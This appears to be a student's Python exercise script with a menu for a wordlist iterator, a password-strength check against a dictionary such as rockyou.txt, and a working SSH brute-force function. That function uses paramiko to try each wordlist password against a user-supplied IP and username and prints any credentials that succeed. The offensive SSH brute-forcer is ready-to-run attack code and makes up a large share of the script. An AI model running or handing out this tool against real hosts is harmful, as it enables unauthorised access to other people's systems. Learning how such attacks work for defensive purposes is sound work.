#!/usr/bin/env python3

# Script Name:                  Brute Force pt 2
# Author:                       Brad Baack
# Date of latest revision:      05/21/2024
# Purpose:                      Create a brute force attack.

# Import libraries
import time  # Import time module for delays
import getpass  # Import getpass module to securely get user passwords
import os  # Import os module for file system operations
import paramiko  # Import paramiko for SSH connections

# Declare functions
def iterator():
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"  # Prompt user for file path, default to 'rockyou.txt'
    #filepath = '/home/osboxes/Desktop/rockyou2.txt' # Alternative test filepath

    if not os.path.isfile(filepath):  # Check if the file exists
        print(f"File not found: {filepath}")  # Print error message if file not found
        return  # Exit the function
    
    file = open(filepath, encoding="ISO-8859-1")  # Open the file with appropriate encoding
    line = file.readline()  # Read the first line from the file
    while line:  # Loop until no more lines in the file
        line = line.rstrip()  # Remove any trailing whitespace from the line
        word = line  # Assign the cleaned line to the variable word
        print(word)  # Print the word
        time.sleep(1)  # Delay for 1 second
        line = file.readline()  # Read the next line from the file
    file.close()  # Close the file

def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password: ")  # Securely get the user's password
    usr_filepath = input("Let's check the strength of that password.\nPlease enter a dictionary filepath:\n") or "rockyou.txt"  # Prompt user for file path, default to 'rockyou.txt'
    #usr_filepath = '/home/osboxes/Desktop/rockyou2.txt' # Alternative test filepath

    if not os.path.isfile(usr_filepath):  # Check if the file exists
        print(f"File not found: {usr_filepath}")  # Print error message if file not found
        return  # Exit the function
    
    print(f"Checking password against the words in '{usr_filepath}', just a moment.")  # Inform the user about the check
    t1 = time.time()  # Record the start time
    file = open(usr_filepath, encoding="ISO-8859-1")  # Open the file with appropriate encoding
    line = file.readline()  # Read the first line from the file
    wordlist = []  # Initialize an empty list to store words
    while line:  # Loop until no more lines in the file
        line = line.rstrip()  # Remove any trailing whitespace from the line
        word = line  # Assign the cleaned line to the variable word
        wordlist.append(word)  # Append the word to the wordlist
        line = file.readline()  # Read the next line from the file
    file.close()  # Close the file
    
    if usr_password not in wordlist:  # Check if the password is not in the wordlist
        print("Your password is acceptable. Good job.")  # Print message if password is not found
    else:
        print("Your password was found in the dictionary. Please choose another password.")  # Print message if password is found
    t2 = time.time()  # Record the end time
    print(f"Password check completed in {t2 - t1:.2f} seconds.")  # Print the duration of the check

def brute_force_ssh():
    # Prompt user for the target IP address
    ip = input("Enter the target IP address:\n")
    # Prompt user for the SSH username
    username = input("Enter the SSH username:\n")
    # Prompt user for the dictionary filepath, with a default of "rockyou.txt"
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    
    # Check if the specified dictionary file exists
    if not os.path.isfile(filepath):
        print(f"File not found: {filepath}")
        return  # Exit if the file does not exist
    
    # Open the dictionary file with the specified encoding
    file = open(filepath, encoding="ISO-8859-1")
    line = file.readline()  # Read the first line from the file
    
    # Initialize the SSH client
    ssh = paramiko.SSHClient()
    # Automatically add the server's host key
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Loop through each line in the dictionary file
    while line:
        line = line.rstrip()  # Remove any trailing whitespace
        password = line  # Use the line as the password
        
        try:
            # Attempt to connect to the SSH server with the current password
            ssh.connect(ip, port=22, username=username, password=password, timeout=3)
            print(f"Success! Username: {username} Password: {password}")
            break  # Exit the loop if the connection is successful
        except paramiko.AuthenticationException:
            # Handle incorrect password
            print(f"Failed: {password}")
        except Exception as e:
            # Handle other exceptions, such as connection errors
            print(f"Connection error: {e}")
            break  # Exit the loop on connection error
        
        line = file.readline()  # Read the next line from the file
    
    file.close()  # Close the dictionary file
    ssh.close()  # Close the SSH connection
# Main
if __name__ == "__main__":  # This condition ensures the script runs only if it is executed directly
    while True:  # Start an infinite loop
        print("\nBrute Force Wordlist Attack Tool Menu")  # Print the menu
        print("1 - Offensive, Dictionary Iterator")  # Option 1: Run the iterator function
        print("2 - Defensive, Password Recognized")  # Option 2: Run the check_password function
        print("3 - Offensive, SSH Brute Force")  # Option 3: Run the brute_force_ssh function
        print("4 - Exit")  # Option 4: Exit the program
        
        mode = input("Please enter a number: ")  # Get user input for menu option
        
        if mode == "1":
            iterator()  # Call the iterator function if user selects mode 1
        elif mode == "2":
            check_password()  # Call the check_password function if user selects mode 2
        elif mode == "3":
            brute_force_ssh()  # Call the brute_force_ssh function if user selects mode 3
        elif mode == "4":
            break  # Exit the loop and end the program if user selects mode 4
        else:
            print("Invalid selection...")  # Print a message if the user enters an invalid selection

# Resources
# https://www.geeksforgeeks.org/iterate-over-a-set-in-python/
# I also worked with Steve on this one a little an I put my code in GPT for the line by line annotation for future reference. 
